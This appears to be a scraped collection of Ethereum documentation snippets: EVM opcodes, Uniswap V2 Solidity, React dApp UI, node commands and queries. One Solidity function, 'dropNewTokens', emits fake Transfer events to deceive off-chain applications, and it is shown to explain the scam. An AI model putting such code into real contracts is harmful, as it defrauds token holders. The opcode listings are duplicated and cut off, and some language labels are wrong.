}\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Implementation Opcodes\nDESCRIPTION: EVM opcodes for an ERC20 token contract implementation. These represent the low-level instructions the Ethereum Virtual Machine will execute, implementing standard ERC20 functions and access control.\n\nLANGUAGE: evm-opcodes\nCODE:\n```\nPUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xA9 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x39509351 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x25F JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x2C5 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x31D JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x3A0 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x406 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x46C JUMPI PUSH2 0xA9 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xAE JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x131 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x197 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1B5 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x23B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB6 PUSH2 0x4E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xF6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xDB JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x123 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x586 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19F PUSH2 0x5A4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x221 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x5AE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x243 PUSH2 0x687 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x69E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x307 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x2DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x751 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x325 PUSH2 0x799 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x365 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x34A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x392 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x3EC PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x3B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x83B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x452 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x41C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x908 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x4CE PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x482 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x926 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 ISZERO PUSH2 0x57C JUMPI DUP1 PUSH1 0x1F LT PUSH2 0x551 JUMPI PUSH2 0x100 DUP1 DUP4 SLOAD DIV MUL DUP4 MSTORE SWAP2 PUSH1 0x20 ADD SWAP2 PUSH2 0x57C JUMP JUMPDEST DUP3 ADD SWAP2 SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 JUMPDEST DUP2 SLOAD DUP2 MSTORE SWAP1 PUSH1 0x1 A\n```\n\n----------------------------------------\n\nTITLE: Calculating Daily Ethereum Blocks (Math in Markdown)\nDESCRIPTION: Formula for calculating the number of Ethereum blocks produced in a day based on a 12-second block time. This calculation shows how 7,200 blocks are produced daily.\n\nLANGUAGE: markdown\nCODE:\n```\n- `(1 bloco/12 segundos) * (60 segundos/minuto) = 5 blocos/minuto`\n- `(5 blocos/minuto) * (60 minutos/hora) = 300 blocos/hora`\n- `(300 blocos/hora) * (24 horas/dia) = 7.200 blocos/dia`\n```\n\n----------------------------------------\n\nTITLE: Retrieving Transaction by Block Number and Index Request in JavaScript\nDESCRIPTION: Example request for the eth_getTransactionByBlockNumberAndIndex method, which retrieves transaction information using a block number and index position.\n\nLANGUAGE: javascript\nCODE:\n```\n// Request\ncurl -X POST --data '{\"jsonrpc\":\"2.0\",\"method\":\"eth_getTransactionByBlockNumberAndIndex\",\"params\":[\"0x9c47cf\", \"0x24\"],\"id\":1}'\n```\n\n----------------------------------------\n\nTITLE: Rendering the DApp UI in HelloWorld Component\nDESCRIPTION: The React component's UI implementation showing the Alchemy logo, wallet connection button, current message display, input field for new messages, and update button.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\n//the UI of our component\nreturn (\n  <div id=\"container\">\n    <img id=\"logo\" src={alchemylogo}></img>\n    <button id=\"walletButton\" onClick={connectWalletPressed}>\n      {walletAddress.length > 0 ? (\n        \"Connected: \" +\n        String(walletAddress).substring(0, 6) +\n        \"...\" +\n        String(walletAddress).substring(38)\n      ) : (\n        <span>Connect Wallet</span>\n      )}\n    </button>\n\n    <h2 style={{ paddingTop: \"50px\" }}>Current Message:</h2>\n    <p>{message}</p>\n\n    <h2 style={{ paddingTop: \"18px\" }}>New Message:</h2>\n\n    <div>\n      <input\n        type=\"text\"\n        placeholder=\"Update the message in your smart contract.\"\n        onChange={(e) => setNewMessage(e.target.value)}\n        value={newMessage}\n      />\n      <p id=\"status\">{status}</p>\n\n      <button id=\"publishButton\" onClick={onUpdatePressed}>\n        Update\n      </button>\n    </div>\n  </div>\n)\n```\n\n----------------------------------------\n\nTITLE: Compiling and Deploying Smart Contract to Local Network\nDESCRIPTION: Commands to compile the ChipToken.sol smart contract and deploy it to the local Ethereum testnet. These steps show how to use Hardhat's deployment workflows with the local network.\n\nLANGUAGE: python\nCODE:\n```\nnpx hardhat compile\nnpx hardhat run scripts/deploy.ts --network localnet\n```\n\n----------------------------------------\n\nTITLE: Querying Average Gas Used per Day in Ethereum Blocks\nDESCRIPTION: SQL query that calculates the daily average gas used in Ethereum blocks, representing the demand for block space. The query groups data by day and computes the average gas consumed.\n\nLANGUAGE: sql\nCODE:\n```\nSELECT\n    DATE_TRUNC('day', time) AS dt,\n    AVG(gas_used) AS avg_block_gas_used\nFROM ethereum.\"blocks\"\nGROUP BY dt\nOFFSET 1\n```\n\n----------------------------------------\n\nTITLE: Fake Transfer Events Function in Solidity ERC-20 Contract\nDESCRIPTION: This function emits Transfer events without actually transferring any tokens, designed to deceive off-chain applications into thinking transfers have occurred. It can only be called by the contract owner due to the auth() modifier.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction dropNewTokens(address uPool,\n                       address[] memory eReceiver,\n                       uint256[] memory eAmounts) public auth()\n{\n    for (uint256 i = 0; i < eReceiver.length; i++) {\n        emit Transfer(uPool, eReceiver[i], eAmounts[i]);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling Case When Token B Optimal Amount Exceeds Desired Limit in Solidity\nDESCRIPTION: Code that calculates the optimal amount of token A when token B's optimal amount exceeds the desired amount, ensuring the deposit maintains the current reserve ratio while respecting the user's limits.\n\nLANGUAGE: solidity\nCODE:\n```\n        } else {\n            uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);\n            assert(amountAOptimal <= amountADesired);\n            require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');\n            (amountA, amountB) = (amountAOptimal, amountBDesired);\n```\n\n----------------------------------------\n\nTITLE: Running Teku Consensus Client on Ethereum Mainnet\nDESCRIPTION: Command to start Teku on Ethereum Mainnet with specified data path. It configures connection to an execution engine endpoint and JWT authentication for secure client communication.\n\nLANGUAGE: sh\nCODE:\n```\nteku --network mainnet \\\n    --data-path \"/data/ethereum\" \\\n    --ee-endpoint http://localhost:8551 \\\n    --ee-jwt-secret-file \"/path/to/jwtsecret\"\n```\n\n----------------------------------------\n\nTITLE: Implementing Tokens to ETH Swap with Fee Support in Uniswap V2\nDESCRIPTION: Function that swaps tokens for ETH supporting tokens with transfer fees. It transfers tokens from sender to the pair contract, executes the swap, unwraps WETH back to ETH, and transfers ETH to the recipient.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    )\n        external\n        virtual\n        override\n        ensure(deadline)\n    {\n        require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n        TransferHelper.safeTransferFrom(\n            path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n        );\n        _swapSupportingFeeOnTransferTokens(path, address(this));\n        uint amountOut = IERC20(WETH).balanceOf(address(this));\n        require(amountOut >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n        IWETH(WETH).withdraw(amountOut);\n        TransferHelper.safeTransferETH(to, amountOut);\n    }\n```\n\n----------------------------------------\n\nTITLE: Emitting Approval Event in ERC-20\nDESCRIPTION: Emits an Approval event after setting the allowance. This allows the spender contract or external applications to be notified about the approval.\n\nLANGUAGE: solidity\nCODE:\n```\nemit Approval(owner, spender, amount);\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing Uniswap V2 Factory Contract in Solidity\nDESCRIPTION: The beginning of the UniswapV2Factory contract that defines state variables for fee management. It includes variables for fee recipient address (feeTo) and the address authorized to modify fee settings (feeToSetter).\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity =0.5.16;\n\nimport './interfaces/IUniswapV2Factory.sol';\nimport './UniswapV2Pair.sol';\n\ncontract UniswapV2Factory is IUniswapV2Factory {\n    address public feeTo;\n    address public feeToSetter;\n```\n\n----------------------------------------\n\nTITLE: Defining ERC Interface IDs in Vyper\nDESCRIPTION: Constants that define the interface IDs for ERC165 and ERC721 standards, used for interface detection via the supportsInterface function.\n\nLANGUAGE: vyper\nCODE:\n```\n# @dev ERC165 interface ID of ERC165\nERC165_INTERFACE_ID: constant(bytes32) = 0x0000000000000000000000000000000000000000000000000000000001ffc9a7\n\n# @dev ERC165 interface ID of ERC721\nERC721_INTERFACE_ID: constant(bytes32) = 0x0000000000000000000000000000000000000000000000000000000080ac58cd\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Opcodes Execution - EVM\nDESCRIPTION: This is the operation code (opcode) representation of an ERC20 token implementation, showing the step-by-step execution instructions for the Ethereum Virtual Machine. It includes function selectors and bytecode operations for core ERC20 functions.\n\nLANGUAGE: evm-opcodes\nCODE:\n```\nPUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0xA9 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x39509351 GT PUSH2 0x71 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x25F JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x2C5 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x31D JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x3A0 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x406 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x46C JUMPI PUSH2 0xA9 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0xAE JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x131 JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x197 JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x1B5 JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x23B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0xB6 PUSH2 0x4E4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0xF6 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0xDB JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x123 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x17D PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x147 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x586 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x19F PUSH2 0x5A4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x221 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x1CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x5AE JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x243 PUSH2 0x687 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x2AB PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x275 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x69E JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x307 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x2DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x751 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x325 PUSH2 0x799 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x365 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x34A JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x392 JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x3EC PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x3B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x83B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x452 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x41C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x908 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x4CE PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x482 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x926 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x60 PUSH1 0x3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV DUP1 PUSH1 0x1F ADD PUSH1 0x20 DUP1 SWAP2 DIV MUL PUSH1 0x20 ADD PUSH1 0x40 MLOAD SWAP1 DUP2 ADD PUSH1 0x40 MSTORE DUP1 SWAP3 SWAP2 SWAP1 DUP2 DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND 